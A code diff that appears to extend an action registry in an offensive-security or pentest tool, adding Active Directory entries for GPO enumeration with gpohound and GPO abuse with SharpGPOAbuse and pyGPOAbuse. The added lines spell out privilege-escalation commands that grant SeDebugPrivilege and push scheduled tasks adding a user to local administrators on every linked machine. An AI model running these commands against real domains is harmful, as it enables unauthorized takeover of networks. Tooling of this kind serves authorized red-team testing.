@@ -472,6 +472,24 @@ ACTION_REGISTRY: dict[str, Action] = {
          "certipy auth -pfx administrator.pfx -dc-ip $IP  # -> NT hash / TGT"],
         risk="propose", runnable=False, outputs="raw",
         note="ADCS abuse (certipy): request a cert as a privileged UPN, then auth -> DA."),
+    "gpohound_enum": _a("gpohound_enum",
+        ["gpohound analysis --enrich -u <USER> -p '<PASS>' -d $DOMAIN -dc-ip $IP",
+         "gpohound dump --list --gpo-name  # inventory GPOs and their links"],
+        runnable=False, outputs="raw",
+        note="Enumerate GPOs and flag ones you can write/link — the entry to a GPO-push privesc."),
+    "gpo_abuse_task": _a("gpo_abuse_task",
+        ["# Windows: add a right / scheduled task / local admin via an editable GPO:",
+         "SharpGPOAbuse.exe --AddUserRights --UserRights 'SeDebugPrivilege,SeTakeOwnershipPrivilege' "
+         "--UserAccount <OWNED_USER> --GPOName '<GPO>'",
+         "SharpGPOAbuse.exe --AddComputerTask --TaskName Upd --Author admin "
+         "--Command cmd.exe --Arguments '/c net localgroup administrators <OWNED_USER> /add' "
+         "--GPOName '<GPO>'",
+         "# Linux: pyGPOAbuse adds an immediate scheduled task under the GPO:",
+         "pygpoabuse.py $DOMAIN/<USER>:'<PASS>' -gpo-id <GUID> -command "
+         "'net localgroup administrators <OWNED_USER> /add' -taskname Upd"],
+        risk="propose", runnable=False, outputs="raw",
+        note="GPO abuse: an editable GPO pushes a scheduled task / user right to every linked "
+             "computer or user on the next gpupdate -> SYSTEM / DA on those hosts."),
     "gpp_decrypt": _a("gpp_decrypt",
         ["gpp-decrypt <cpassword>  # from Groups.xml in SYSVOL"],
         risk="read_only", runnable=False, outputs="raw",
